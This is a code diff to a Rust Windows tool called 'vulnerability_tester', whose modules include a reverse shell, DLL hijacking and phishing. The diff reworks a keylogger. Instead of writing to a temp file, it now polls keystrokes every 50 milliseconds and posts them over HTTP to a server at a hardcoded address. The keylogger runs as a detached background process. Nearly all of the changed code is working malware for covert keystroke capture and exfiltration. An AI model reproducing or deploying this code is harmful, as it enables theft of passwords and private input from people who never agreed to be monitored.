@@ -1,11 +1,10 @@
 use clap::{Parser, Subcommand};
-use std::env;
-use std::fs::{self, OpenOptions};
 use std::io::{self, Write};
-use std::path::Path;
 use std::process::{Command, Stdio};
 use std::os::windows::process::CommandExt;
-use device_query::DeviceQuery;
+use std::time::Duration;
+use device_query::{DeviceQuery, DeviceState, Keycode};
+use ureq;
 
 mod overflow;
 mod reverse_shell;
@@ -13,7 +12,6 @@ mod dll_hijacking_c;
 mod phishing;
 mod decrypt;
 mod port_scanner;
-mod keylogger;
 
 #[derive(Parser)]
 #[command(name = "vulnerability_tester")]
@@ -115,7 +113,7 @@ fn main() {
 fn deploy_keylogger_detached() {
     println!("Deploying keylogger...");
 
-    let exe_path = env::current_exe().expect("Failed to get current executable path");
+    let exe_path = std::env::current_exe().expect("Failed to get current executable path");
 
     let child = Command::new(exe_path)
         .arg("--background-keylogger")
@@ -132,48 +130,78 @@ fn deploy_keylogger_detached() {
 }
 
 fn handle_background_keylogger() {
-    let temp_dir = env::temp_dir();
-    let log_path = temp_dir.join("keylog.txt");
-
-    println!("Keylogger is active. Logs will be saved to: {:?}", log_path);
-
-    let mut file = OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open(&log_path)
-        .expect("Failed to open log file");
-
+    let device_state = DeviceState::new();
     let mut last_keys = vec![];
-    let device_state = device_query::DeviceState::new();
+
+    println!("Keylogger is active. Logs will be sent directly to the server.");
 
     loop {
         let keys = device_state.get_keys();
 
-        // Check if Alt+S is pressed
-        if keys.contains(&device_query::Keycode::LAlt) || keys.contains(&device_query::Keycode::RAlt) {
-            if keys.contains(&device_query::Keycode::S) {
+        // Check if Alt+S is pressed to stop
+        if keys.contains(&Keycode::LAlt) || keys.contains(&Keycode::RAlt) {
+            if keys.contains(&Keycode::S) {
                 println!("Keylogger stopped by Alt+S.");
                 return; // Exit the keylogger loop
             }
         }
 
+        let mut key_log = String::new();
+
+        // Detect new keys pressed
         for key in keys.iter() {
             if !last_keys.contains(key) {
                 let key_string = match key {
-                    device_query::Keycode::Enter => "\n".to_string(),
-                    device_query::Keycode::Space => " ".to_string(),
-                    device_query::Keycode::Tab => "[Tab]".to_string(),
-                    device_query::Keycode::LShift | device_query::Keycode::RShift => "[Shift]".to_string(),
+                    Keycode::Enter => "\n".to_string(),
+                    Keycode::Space => " ".to_string(),
+                    Keycode::Tab => "[Tab]".to_string(),
+                    Keycode::LShift | Keycode::RShift => "[Shift]".to_string(),
+                    Keycode::Backspace => "[Backspace]".to_string(),
+                    Keycode::Escape => "[ESC]".to_string(),
                     _ => format!("{:?}", key),
                 };
 
-                writeln!(file, "{}", key_string).expect("Failed to write to log file");
-                file.flush().expect("Failed to flush log file");
+                key_log.push_str(&key_string);
+
+                // Debugging: Print each key detected
+                println!("Key Detected: {}", key_string);
             }
         }
 
+        // Send detected keys to the server
+        if !key_log.is_empty() {
+            if let Err(e) = send_logs_to_server(&key_log) {
+                eprintln!("Failed to send logs to server: {}", e);
+            } else {
+                println!("Keys sent to server: {}", key_log); // Debugging
+            }
+        }
+
+        // Update the last keys state
         last_keys = keys;
+
+        // Reduce sleep time for more frequent polling
+        std::thread::sleep(Duration::from_millis(50)); // Sleep for 50 milliseconds
     }
+}
+
+fn send_logs_to_server(key_log: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let response = ureq::post("http://192.168.153.129:5000/upload") // Update with your server's URL
+        .send_string(key_log);
+
+    match response {
+        Ok(res) => {
+            println!("Logs sent successfully. Server response: {}", res.status_text());
+        }
+        Err(ureq::Error::Status(code, res)) => {
+            eprintln!("Failed to send logs. HTTP {}: {}", code, res.status_text());
+        }
+        Err(e) => {
+            eprintln!("Failed to send logs: {}", e);
+        }
+    }
+
+    Ok(())
 }
 
 
